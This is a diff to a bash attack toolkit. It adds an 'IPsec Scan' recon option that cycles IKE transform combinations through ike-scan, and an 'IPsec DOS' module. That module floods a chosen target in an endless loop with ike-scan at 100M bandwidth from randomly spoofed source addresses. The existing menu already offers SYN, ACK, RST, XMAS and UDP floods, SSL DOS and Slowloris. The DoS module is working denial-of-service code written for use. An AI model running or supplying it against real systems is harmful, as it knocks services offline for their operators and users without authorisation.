@@ -39,7 +39,7 @@ done
 reconmenu()
 {
 #build a menu for the recon modules using bash select
-		reconmenu=("Show IP" "DNS Recon" "Ping Sweep" "Quick Scan" "Detailed Scan" "UDP Scan" "Check Server Uptime" "Go back")
+		reconmenu=("Show IP" "DNS Recon" "Ping Sweep" "Quick Scan" "Detailed Scan" "UDP Scan" "Check Server Uptime" "IPsec Scan" "Go back")
 	select reconopt in "${reconmenu[@]}"; do
 #show external IP & interface IP(s)
 	if [ "$reconopt" = "Show IP" ]; then
@@ -62,6 +62,9 @@ reconmenu()
 #Check uptime of server
     elif [ "$reconopt" = "Check Server Uptime" ]; then
         checkuptime
+#IPsec Scan
+	elif [ "$reconopt" = "IPsec Scan" ]; then
+		ipsecscan
 #Go back
 	elif [ "$reconopt" = "Go back" ]; then
 		mainmenu
@@ -231,6 +234,33 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 }
 ##END CHECKUPTIME##
 ###################
+
+####################
+##START IPSEC SCAN##
+ipsecscan()
+{ echo "Please enter the target hostname or IP:"
+#we need to know where to scan
+read -i $TARGET -e TARGET
+# Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256
+ENCLIST="1 5 7/128 7/192 7/256"
+# Hash algorithms: MD5, SHA1, SHA-256, SHA-384 and SHA-512
+HASHLIST="1 2 4 5 6"
+# Authentication methods: Pre-Shared Key, RSA Signatures, Hybrid Mode and XAUTH
+AUTHLIST="1 3 64221 65001"
+# Diffie-Hellman groups: 1, 2, 5 and 12
+GROUPLIST="1 2 5 12"
+for ENC in $ENCLIST; do
+   for HASH in $HASHLIST; do
+      for AUTH in $AUTHLIST; do
+         for GROUP in $GROUPLIST; do
+          sudo echo "--trans=$ENC,$HASH,$AUTH,$GROUP" | sudo xargs --max-lines=8 ike-scan --retry=1 -R -M $TARGET | grep -v "Starting" | grep -v "0 returned handshake; 0 returned notify"
+         done
+      done
+   done
+done
+}
+##END IPSECSCAN##
+#################
 ##/RECON##
 #############
 
@@ -241,7 +271,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 dosmenu()
 {
 #display a menu for the DOS module using bash select
-		dosmenu=("TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "Distraction Scan" "Go back")
+		dosmenu=("TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPsec DOS" "Distraction Scan" "Go back")
 	select dosopt in "${dosmenu[@]}"; do
 #TCP SYN Flood DOS
  	if [ "$dosopt" = "TCP SYN Flood" ]; then
@@ -264,6 +294,9 @@ dosmenu()
 #Slowloris
 	elif [ "$dosopt" = "Slowloris" ]; then
 		slowloris
+#IPsec DOS
+	elif [ "$dosopt" = "IPsec DOS" ]; then
+		ipsecdos
 #Distraction scan
 	elif [ "$dosopt" = "Distraction Scan" ]; then
 		distractionscan
@@ -899,6 +932,21 @@ echo "Opened $CONNS connections....returning to menu"
 fi
 }
 ##END SLOWLORIS##
+#################
+
+###################
+##START IPSEC DOS##
+ipsecdos()
+{ echo "This module will attempt to spoof an IPsec server, with a spoofed source address"
+echo "Enter target IP or hostname:"
+read -i $TARGET -e TARGET
+#launch DOS with a random source address by default
+echo "IPsec DOS underway...use 'Ctrl C' to stop" &&
+while :
+do sudo ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; sudo ike-scan -B 100M -t 1 -q --sourceip=random $TARGET 1>/dev/null
+done
+}
+##END IPSEC DOS##
 #################
 
 #####################
